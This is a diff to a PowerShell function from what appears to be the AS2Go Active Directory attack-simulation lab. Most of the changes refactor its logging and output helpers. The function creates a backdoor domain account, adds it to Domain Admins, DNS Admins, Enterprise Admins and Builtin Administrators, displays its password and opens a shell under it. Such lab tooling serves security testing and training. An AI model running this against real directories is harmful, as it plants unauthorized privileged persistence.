@@ -1,3 +1,18 @@
+<#
+.SYNOPSIS
+Creates a backdoor account for the AS2Go Active Directory lab.
+
+.DESCRIPTION
+Creates and enables an account, attempts to assign privileged group memberships, and checks account sign-in.
+
+.COMPONENT
+Category: Main Function
+
+.FUNCTIONALITY
+Creates and enables a backdoor AD account, then attempts to assign privileged group memberships.
+On success, displays generated credentials, checks group memberships, and tests account sign-in.
+Attempts to launch PowerShell under the new account.
+#>
 function New-BackDoorUser {
     
     ################################################################################
@@ -6,10 +21,7 @@ function New-BackDoorUser {
     #####                                                                      #####
     ################################################################################
 
-    $CurrentFunction = Get-FunctionName
-    Write-Log -Message "### Start Function $CurrentFunction ###"
-    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
-    #################### main code | out- host ####################
+    $Info = Measure-FunctionRuntime -Begin
 
     $FirstName = Get-Date -Format HHmmss
     $LastName = Get-Date -Format yyyyMMdd
@@ -54,11 +66,11 @@ function New-BackDoorUser {
             -PassThru -Server $Script:ASDC | Enable-ADAccount
 
         Write-Host ""
-        Invoke-Output -Type Bullet -Message "New backdoor account:" -Textmaker $user
-        Invoke-Output -Type Bullet -Message "current password    :" -Textmaker $BDUserPW
+        Write-AS2GoOutput -Type Bullet -Message "New backdoor account:" -Textmaker $user
+        Write-AS2GoOutput -Type Bullet -Message "current password    :" -Textmaker $BDUserPW
     }
     catch {
-        Invoke-Output -type Error -Message "Creation of backdoor user $UPN failed, likely due to '$_'."
+        Write-AS2GoOutput -type Error -Message "Creation of backdoor user $UPN failed, likely due to '$_'."
         pause
         return
     }
@@ -67,14 +79,14 @@ function New-BackDoorUser {
         Add-ADGroupMember -Identity $Script:GroupDA.SID -Members $samaccountname  -Server $Script:ASDC
     }
     catch {
-        Invoke-Output -Type Error -Message $_
+        Write-AS2GoOutput -Type Error -Message $_
     }
 
     try {
         Add-ADGroupMember -Identity $Script:GroupDNSA.SID -Members $samaccountname -Server $Script:ASDC
     }
     catch {
-        Invoke-Output -Type Error -Message $_
+        Write-AS2GoOutput -Type Error -Message $_
     }
 
   
@@ -104,7 +116,7 @@ function New-BackDoorUser {
         $NewMember = Get-ADUser -Identity $samaccountname -Server $Script:ASDC
         $EntAdmins = Get-ADGroup -Identity $Script:GroupEA.SID -Server $rootDC
     
-        Invoke-Output -Type Bullet -Message "Adding account to   :" -Textmaker $($EntAdmins.DistinguishedName)
+        Write-AS2GoOutput -Type Bullet -Message "Adding account to   :" -Textmaker $($EntAdmins.DistinguishedName)
         Start-Sleep -Seconds 10
         Set-ADGroup -Identity $EntAdmins.DistinguishedName `
             -Add @{ member = $NewMember.DistinguishedName } `
@@ -130,7 +142,7 @@ function New-BackDoorUser {
                 -Server $ADDomain.DomainFQDN `
                 -ErrorAction Stop
             Write-Log -Message "    >> Added backdoor user '$samaccountname' to $($BuiltinAdmins.DistinguishedName)"
-            Invoke-Output -Type Bullet -Message "Added account to   :" -Textmaker $($BuiltinAdmins.DistinguishedName)
+            Write-AS2GoOutput -Type Bullet -Message "Added account to   :" -Textmaker $($BuiltinAdmins.DistinguishedName)
         }
         Catch {
             Write-Log -Message "$_."
@@ -172,15 +184,12 @@ function New-BackDoorUser {
     Start-Process pwsh -Credential $global:BDCred -ArgumentList "-NoExit", "-Command", "whoami /groups"
 
     if (Test-ADLogon -Credential $global:BDCred -DomainController $Script:ASDC -Domain $fqdn) {
-        Invoke-Output -Type Success -Message "Test logon for backdoor account '$UPN' succeeded."
+        Write-AS2GoOutput -Type Success -Message "Test logon for backdoor account '$UPN' succeeded."
     }
     else {
-        Invoke-Output -Type Error -Message "Test logon for backdoor account '$UPN' FAILED."
+        Write-AS2GoOutput -Type Error -Message "Test logon for backdoor account '$UPN' FAILED."
     }
 
     Write-Log -Message "    >> Created Backdoor Account '$samaccountname'."
-    ######################## main code ############################
-    $runtime = Get-RunTime -StartRunTime $StartRunTime
-    Write-Log -Message "    Run Time: $runtime [h] ###"
-    Write-Log -Message "### End Function $CurrentFunction ###"
+    Measure-FunctionRuntime -End -Details $Info
 }
